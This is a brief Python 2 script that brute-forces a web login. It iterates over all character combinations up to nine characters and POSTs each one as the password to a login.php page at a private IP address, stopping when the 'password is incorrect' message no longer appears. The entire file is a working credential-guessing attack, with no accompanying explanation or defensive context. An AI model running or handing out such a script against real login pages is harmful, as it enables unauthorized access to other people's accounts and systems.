import itertools
from itertools import product
import string
import urllib
import urllib2
import re
import time 
for x in range (10):
	for guess in itertools.product((string.lowercase + string.uppercase + string.digits + string.punctuation), repeat=x):
		i = ''.join(guess)
		postdata = urllib.urlencode({'username': 'username','password': str(i)})
		print postdata
		content = urllib2.urlopen('http://10.0.0.1/login.php',postdata).read()
		print content
		matches = re.findall(r'(?i)password.*?is incorrect.', content)
		print matches
		if len(matches) > 0:
			print "no"
			continue
		else:
			print "\n\nPassword found - " + i
			break